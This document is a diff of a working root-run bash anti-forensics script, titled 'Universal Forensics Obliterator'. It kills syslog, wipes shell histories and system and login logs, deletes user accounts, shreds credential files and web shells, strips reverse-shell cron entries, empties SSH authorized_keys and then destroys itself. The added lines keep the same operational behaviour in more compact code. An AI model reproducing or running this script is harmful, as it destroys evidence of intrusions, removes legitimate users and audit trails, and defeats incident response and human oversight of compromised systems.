@@ -11,89 +11,51 @@ echo ''
 echo '       Linux Anti-Forensics Automation Tool'
 echo ''
 
-# Safety: must be root
-if [ "$EUID" -ne 0 ] && [ "$UID" -ne 0 ]; then
-    echo "Must be root."
-    exit 1
-fi
-
-SELF=$(readlink -f "$0")
-
-echo "[*] Halting system logging..."
-/etc/init.d/sysklogd stop 2>/dev/null
-/etc/init.d/rsyslog stop 2>/dev/null
-killall -9 syslogd rsyslogd 2>/dev/null
-
-echo "[*] Wiping user histories (bash & zsh)..."
-for home in /root /home/*; do
-    [ -d "$home" ] || continue
-    rm -f "$home/.bash_history" "$home/.bash_logout" 2>/dev/null
-    rm -f "$home/.zsh_history" "$home/.zhistory" 2>/dev/null
-    ln -sf /dev/null "$home/.bash_history" 2>/dev/null
+if [ "$(id -u)" -ne 0 ]; then echo "Must be root."; exit 1; fi
+SELF=$(readlink -f "$0" 2>/dev/null || echo "$0")
+echo "=== UFO: Universal Forensics Obliterator ==="
+echo "[*] Halting logging..."
+killall -9 syslogd rsyslogd syslog-ng 2>/dev/null
+echo "[*] Wiping all histories..."
+for d in /root /home/*; do
+    [ -d "$d" ] || continue
+    rm -f "$d/.bash_history" "$d/.bash_logout" "$d/.zsh_history" "$d/.zhistory" "$d/.history" 2>/dev/null
+    ln -sf /dev/null "$d/.bash_history" 2>/dev/null
 done
-
-echo "[*] Wiping current shell history..."
-case "$SHELL" in
-    */zsh)
-        rm -f "$HOME/.zsh_history" 2>/dev/null
-        fc -P 2>/dev/null
-        ;;
-    *)
-        history -c 2>/dev/null
-        ;;
-esac
-unset HISTFILE
-export HISTSIZE=0
-
-echo "[*] Wiping all system logs..."
-cd /var/log 2>/dev/null || cd /var
-for log in auth.log syslog messages debug daemon.log kern.log mail.log mail.info mail.warn mail.err user.log boot dmesg udev; do
-    > "$log" 2>/dev/null
-    rm -f "$log"* 2>/dev/null
+rm -f /root/.history /root/.sh_history 2>/dev/null
+case "$SHELL" in *zsh) fc -P 2>/dev/null;; *) history -c 2>/dev/null;; esac
+HISTFILE=/dev/null; export HISTSIZE=0
+echo "[*] Wiping logs..."
+cd /var/log 2>/dev/null
+for f in auth.log syslog messages debug daemon kern mail mail.info mail.warn mail.err user boot dmesg udev wtmp btmp lastlog faillog tallylog; do
+    > "$f" 2>/dev/null || true; rm -f "$f"? "$f".gz "$f".?.gz 2>/dev/null
 done
-for blog in wtmp btmp lastlog faillog tallylog; do
-    > "$blog" 2>/dev/null
+rm -rf apache2/* proftpd/* mysql/* postgresql/* samba/* 2>/dev/null
+find /var/log -name "*.gz" -o -name "*.1" -o -name "*.old" -delete 2>/dev/null
+echo "[*] Removing non-system users..."
+for u in $(awk -F: '$3>=1000 && $3<65534{print$1}' /etc/passwd 2>/dev/null); do
+    case "$u" in msfadmin|user|service|ftp|ubuntu|kali|vagrant) continue;; esac
+    pkill -u "$u" 2>/dev/null; userdel -r "$u" 2>/dev/null
 done
-rm -f /var/log/apache2/* /var/log/proftpd/* /var/log/mysql/* /var/log/postgresql/* /var/log/samba/* /var/log/*.gz /var/log/*.1 /var/log/*.old 2>/dev/null
-
-echo "[*] Removing non-default users (UID>=1000)..."
-for user in $(awk -F: '$3>=1000 && $3<65534 {print $1}' /etc/passwd 2>/dev/null); do
-    case "$user" in
-        msfadmin|user|service|ftp) continue ;;
-    esac
-    pkill -u "$user" 2>/dev/null
-    userdel -r "$user" 2>/dev/null
-done
-
-echo "[*] Shredding suspicious files..."
+echo "[*] Shredding artifacts..."
 shred -zun 3 /tmp/bashdoor /tmp/cc.txt /tmp/creds.txt /dev/shm/root.hash 2>/dev/null
-rm -rf /tmp/.stash /tmp/.hidden* /tmp/.cache* 2>/dev/null
+rm -rf /tmp/.stash /tmp/.hidden* /tmp/.cache* /dev/shm/.wipe 2>/dev/null
 rm -f /var/www/shell.php /var/www/backdoor.php /var/www/.shell* 2>/dev/null
-rm -f /usr/local/bin/.backdoor* /usr/share/man/man3/.loader 2>/dev/null
 find /tmp /var/tmp /dev/shm -type f -perm -4000 -exec rm -f {} \; 2>/dev/null
-
-echo "[*] Cleaning cron, SSH keys, configs..."
+echo "[*] Cleaning persistence..."
 sed -i '/nc -e/d; /bash -c/d; /reverse/d; /evil/d; /backdoor/d; /autowipe/d' /etc/crontab 2>/dev/null
 rm -f /var/spool/cron/crontabs/* /usr/local/bin/autowipe.sh 2>/dev/null
-for home in /root /home/*; do
-    [ -d "$home/.ssh" ] && {
-        > "$home/.ssh/authorized_keys" 2>/dev/null
-        > "$home/.ssh/known_hosts" 2>/dev/null
-    }
+for d in /root /home/*; do
+    [ -d "$d/.ssh" ] && { > "$d/.ssh/authorized_keys" 2>/dev/null; > "$d/.ssh/known_hosts" 2>/dev/null; }
 done
 sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config 2>/dev/null
-sed -i '/evil.com/d; /c2-server/d; /hacker/d' /etc/hosts 2>/dev/null
+sed -i '/evil\.com/d; /c2-server/d; /hacker/d' /etc/hosts 2>/dev/null
 ip neigh flush all 2>/dev/null
-
-echo "[*] Wiping free slack space..."
-dd if=/dev/zero of=/tmp/.wipe bs=1M count=10 2>/dev/null
-rm -f /tmp/.wipe 2>/dev/null
-dd if=/dev/zero of=/dev/shm/.wipe bs=1M count=10 2>/dev/null
-rm -f /dev/shm/.wipe 2>/dev/null
-
-echo "[+] Cleanup complete. Self-destructing..."
-shred -zun 3 "$SELF" 2>/dev/null
-rm -f "$SELF" 2>/dev/null
-history -c 2>/dev/null
+echo "[*] Wiping slack..."
+dd if=/dev/zero of=/tmp/.w bs=1M count=10 2>/dev/null; rm -f /tmp/.w 2>/dev/null
+dd if=/dev/zero of=/dev/shm/.w bs=1M count=10 2>/dev/null; rm -f /dev/shm/.w 2>/dev/null
+echo "[+] Done. Self-destructing..."
+shred -zun 3 "$SELF" 2>/dev/null; rm -f "$SELF" 2>/dev/null
+case "$SHELL" in *zsh) fc -P 2>/dev/null;; *) history -c 2>/dev/null;; esac
 kill -9 $$ 2>/dev/null
 exit 0
